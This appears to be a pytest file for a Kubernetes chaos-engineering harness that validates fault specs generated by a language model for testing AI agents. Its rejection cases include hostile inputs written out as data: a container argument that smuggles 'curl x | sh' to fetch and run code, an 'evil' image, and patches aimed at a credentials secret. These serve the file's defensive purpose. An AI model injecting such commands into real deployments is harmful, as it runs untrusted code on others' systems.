"""Faults written as data, and the model-driven generator. No cluster or API calls."""

import copy
from types import SimpleNamespace as NS

import pytest
import yaml

from kubebreaker import sweep
from kubebreaker.chaos import generate, generated
from kubebreaker.chaos.base import Tier
from kubebreaker.llm import LLMResponse, Message, Usage

SPEC = {
    "id": "gen-orders-url-port",
    "title": "api points at the wrong orders port",
    "tier": "medium",
    "alert": "HighErrorRate: the shop frontend is returning 5xx errors for most requests.",
    "ground_truth": "api-config ORDERS_URL uses port 8081; orders listens on 8080.",
    "expected_fix": "Set ORDERS_URL back to http://orders:8080 and restart the api.",
    "inject": [
        {
            "op": "patch",
            "kind": "configmap",
            "name": "api-config",
            "patch": {"data": {"ORDERS_URL": "http://orders:8081"}},
        },
        {"op": "restart", "kind": "deployment", "name": "api"},
    ],
    "reference_fix": [
        {
            "op": "patch",
            "kind": "configmap",
            "name": "api-config",
            "patch": {"data": {"ORDERS_URL": "http://orders:8080"}},
        },
        {"op": "restart", "kind": "deployment", "name": "api"},
    ],
}


def with_inject(op: dict, **top) -> dict:
    spec = copy.deepcopy(SPEC)
    spec["inject"] = [op]
    spec.update(top)
    return spec


def container(name: str, **fields) -> dict:
    return {"spec": {"template": {"spec": {"containers": [{"name": name, **fields}]}}}}


def test_a_well_formed_spec_passes_and_builds():
    assert generated.validate(SPEC) == []
    fault = generated.build(SPEC)
    assert fault.tier == Tier.MEDIUM
    assert fault.fix_scope == ("configmap/api-config:data.ORDERS_URL",)
    assert fault.allowed_restarts == ("api",)


@pytest.mark.parametrize(
    ("op", "message"),
    [
        (
            {
                "op": "patch",
                "kind": "deployment",
                "name": "api",
                "patch": container("api", command=["sh"]),
            },
            "command: not an allowed field",
        ),
        (
            {
                "op": "patch",
                "kind": "deployment",
                "name": "api",
                "patch": container("api", readinessProbe={"exec": {"command": ["true"]}}),
            },
            "exec: not an allowed field",
        ),
        (
            {
                "op": "patch",
                "kind": "deployment",
                "name": "api",
                "patch": container("api", image="evil/x:1"),
            },
            "only a different tag",
        ),
        (
            {
                "op": "patch",
                "kind": "deployment",
                "name": "redis",
                "patch": container("redis", args=["--maxmemory 1mb; curl x | sh"]),
            },
            "plain flags",
        ),
        (
            {
                "op": "patch",
                "kind": "deployment",
                "name": "api",
                "patch": {"spec": {"template": {"spec": {"volumes": [{"name": "h"}]}}}},
            },
            "volumes: not an allowed field",
        ),
        (
            {"op": "patch", "kind": "secret", "name": "postgres-credentials", "patch": {}},
            "patch works on",
        ),
        ({"op": "restart", "kind": "deployment", "name": "loadgen"}, "off limits"),
        ({"op": "patch", "kind": "service", "name": "nope", "patch": {}}, "no baseline service"),
        (
            {"op": "patch", "kind": "deployment", "name": "api", "patch": container("sidecar")},
            "no container 'sidecar'",
        ),
        ({"op": "create", "kind": "deployment", "name": "x", "spec": {}}, "only NetworkPolicies"),
        (
            {"op": "create", "kind": "networkpolicy", "name": "x", "spec": {"hostNetwork": True}},
            "NetworkPolicy spec",
        ),
        ({"op": "exec", "kind": "deployment", "name": "api"}, "expected patch, create"),
    ],
)
def test_unsafe_operations_are_rejected(op, message):
    errors = generated.validate(with_inject(op))
    assert any(message in e for e in errors), errors


def test_reference_fix_may_only_delete_what_inject_created():
    spec = copy.deepcopy(SPEC)
    spec["reference_fix"] = [{"op": "delete", "kind": "networkpolicy", "name": "default-deny"}]
    assert any("this fault created" in e for e in generated.validate(spec))
    spec["inject"].append(
        {
            "op": "create",
            "kind": "networkpolicy",
            "name": "default-deny",
            "spec": {"podSelector": {}, "policyTypes": ["Ingress"]},
        }
    )
    assert generated.validate(spec) == []
    assert "networkpolicy/default-deny" in generated.fix_scope(spec)


def test_alerts_must_be_real_rules_and_not_give_the_cause_away():
    assert any("must start with" in e for e in generated.validate({**SPEC, "alert": "Oops: x"}))
    leaky = {**SPEC, "alert": "HighErrorRate: api calls http://orders:8081 and fails."}
    assert any("gives away" in e for e in generated.validate(leaky))
    crash = {**SPEC, "alert": "KubePodCrashLooping: pods of deployment shop/api restart."}
    assert any("target" in e for e in generated.validate(crash))
    assert generated.validate({**crash, "target": "api"}) == []


def test_copies_of_catalog_faults_and_bad_ids_are_rejected():
    dup = with_inject(
        {
            "op": "patch",
            "kind": "configmap",
            "name": "orders-config",
            "patch": {"data": {"DB_HOST": "postgres-old"}},
        }
    )
    assert any("wrong-db-host" in e for e in generated.validate(dup))
    assert any("gen-some-name" in e for e in generated.validate({**SPEC, "id": "Orders"}))
    assert generated.validate("not a map") == ["spec must be a map"]


def test_container_scopes_cover_the_whole_field():
    spec = with_inject(
        {
            "op": "patch",
            "kind": "deployment",
            "name": "orders",
            "patch": container("orders", env=[{"name": "DB_PORT", "value": "5433"}]),
        }
    )
    assert generated.fix_scope(spec) == (
        "deployment/orders:spec.template.spec.containers[orders].env",
    )


def test_inject_and_fix_apply_each_operation_in_order():
    calls = []
    k = NS(
        namespace="shop",
        api_client=None,
        core=NS(patch_namespaced_config_map=lambda n, ns, p: calls.append(("cm", n, p))),
        restart_deployment=lambda n: calls.append(("restart", n)),
    )
    fault = generated.build(SPEC)
    fault.inject(k)
    fault.reference_fix(k)
    assert [c[0] for c in calls] == ["cm", "restart", "cm", "restart"]
    assert calls[0][2] == {"data": {"ORDERS_URL": "http://orders:8081"}}


def test_only_verified_specs_join_experiments(tmp_path, monkeypatch):
    monkeypatch.setattr(generated, "GENERATED_DIR", tmp_path)
    monkeypatch.setattr(generated.load_all, "__defaults__", (tmp_path,))
    generated.save(SPEC, tmp_path)
    other = {**SPEC, "id": "gen-other", "verified": True}
    generated.save(other, tmp_path)
    (tmp_path / "gen-broken.yaml").write_text(yaml.safe_dump({"id": "gen-broken"}))
    assert set(generated.load_all(tmp_path)) == {"gen-orders-url-port", "gen-other"}
    assert sweep.resolve_faults(["generated"]) == ["gen-other"]
    generated.mark_verified("gen-orders-url-port", tmp_path)
    assert yaml.safe_load((tmp_path / "gen-orders-url-port.yaml").read_text())["verified"]


class FakeGenerator:
    provider, model = "google", "gemini-3.8-flash"

    def __init__(self, reply: str):
        self.reply, self.prompts = reply, []

    def chat(self, system, messages, tools):
        self.prompts.append(messages[0].text)
        return LLMResponse(Message("assistant", self.reply), Usage(1000, 500), "end")


def test_generate_saves_valid_specs_and_explains_rejections(tmp_path):
    bad = {
        **SPEC,
        "id": "gen-bad",
        "inject": [{"op": "restart", "kind": "deployment", "name": "loadgen"}],
    }
    reply = "```yaml\n" + yaml.safe_dump([SPEC, bad]) + "```"
    llm = FakeGenerator(reply)
    out = generate.generate(2, llm=llm, directory=tmp_path)
    assert [p.name for p in out.saved] == ["gen-orders-url-port.yaml"]
    assert out.rejected[0][0] == "gen-bad"
    saved = yaml.safe_load(out.saved[0].read_text())
    assert saved["verified"] is False and saved["generated_by"] == "google/gemini-3.8-flash"
    # Asking again doesn't overwrite an existing spec
    again = generate.generate(1, llm=FakeGenerator(yaml.safe_dump([SPEC])), directory=tmp_path)
    assert not again.saved and "already exists" in again.rejected[0][1][0]


def test_prompt_shows_the_app_without_secrets_and_the_weak_faults(tmp_path):
    d = tmp_path / "sweep" / "terra" / "redis-oom" / "r1"
    d.mkdir(parents=True)
    (d / "result.json").write_text(
        '{"fault_id": "redis-oom", "resolved": true, "root_cause_verdict": "wrong"}'
    )
    prompt = generate.build_prompt(3, tmp_path / "sweep")
    assert "Propose 3 new faults" in prompt and "orders-config" in prompt
    assert "shop-local-password" not in prompt and "kind: Secret" not in prompt
    assert "redis-oom: solved 0/1" in prompt


def test_unparseable_replies_raise():
    with pytest.raises(ValueError, match="list of specs"):
        generate.parse_specs("just some prose")
